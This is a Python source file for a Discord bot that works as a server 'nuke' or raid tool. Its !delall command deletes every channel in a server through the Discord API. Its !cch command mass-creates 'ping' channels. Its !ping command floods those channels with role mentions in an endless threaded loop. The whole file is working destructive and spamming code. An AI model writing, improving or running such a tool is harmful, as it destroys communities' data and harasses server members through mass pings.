import discord
from discord.ext import commands
import requests
import threading
client = discord.Client()
client = commands.Bot(command_prefix = '!')
pingroleid = ""
token = ''
headers = {
                    'authorization': f'Bot {token}'
                }
@client.command()
async def ping(ctx):
    guild = ctx.guild
    await ctx.reply("Pinging all members in the server (this may take a while)...")
    while True:
     for channel in guild.channels:
        if channel.name.startswith("ping"):
             def send():
                
                requests.post(f"https://discord.com/api/v9/channels/{channel.id}/messages", headers=headers, json={'content': f'<@&{pingroleid}>'})
             threading.Thread(target=send).start()
@client.command()
async def delall(ctx):
    for channel in ctx.guild.channels:
        def delete():
            r = requests.delete(f'https://discord.com/api/v9/channels/{channel.id}', headers=headers)
            print(r.status_code)
        threading.Thread(target=delete).start()
@client.command()
async def cch(ctx, amount:int):
    for i in range(amount):
        def create():
            r = requests.post(f'https://discord.com/api/v9/guilds/{ctx.guild.id}/channels', headers=headers, json={'name': f'ping-{i}'})
            print(r.status_code)
        threading.Thread(target=create).start()
client.run(token)
